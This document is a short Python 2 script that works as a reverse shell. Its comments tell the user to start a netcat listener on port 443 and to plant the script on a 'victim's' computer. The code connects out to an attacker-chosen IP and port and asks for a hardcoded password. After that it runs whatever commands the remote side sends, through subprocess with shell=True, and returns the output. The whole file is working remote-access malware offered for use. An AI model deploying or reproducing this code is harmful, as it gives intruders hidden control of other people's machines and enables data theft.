
#!/usr/bin/python
import subprocess #Process commands
import socket #Process socket data
import os
import sys
import time
W  = '[0m'  # white (normal)
R  = '[31m' # red
G  = '[32m' # green
O  = '[33m' # orange
B  = '[34m' # blue
P  = '[35m' # purple
C  = '[36m' # cyan
GR = '[37m' # gray
T  = '[93m' # tan
#To test this on one computer open 2 terminals and make sure your root.
#In terminal 1 type "nc -lvp 443" without the quotes
#Or use the listener
#In the other terminal open the this python script and there you go! 
#[!]You have get this python script onto the victims computer[!]#
#--------------THE REAL CODE---------------#

host = "127.0.0.1" #Attack computers ip <-- Change to whatever your ip is (internal)
port = 443   #Attack port
passwd = "root" #Password so other people cant connect

#Check password
def Login():
   global s
   s.send(""+T+"Login:"+W+"")
   pwd = s.recv(1024)

   if pwd.strip() != passwd:     
      Login()
   else:
      s.send(""+G+"Connected #>"+W+"")
      Shell()

#Execute shell commands
def Shell():
   while True:
      data = s.recv(1024)

      if data.strip() == ":kill": 
         break

      proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
      output = proc.stdout.read() + proc.stderr.read()
      s.send(output)
      s.send(""+G+"#>"+W+"")

#Start Script
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    print ""
    Login()
except:
    print ""
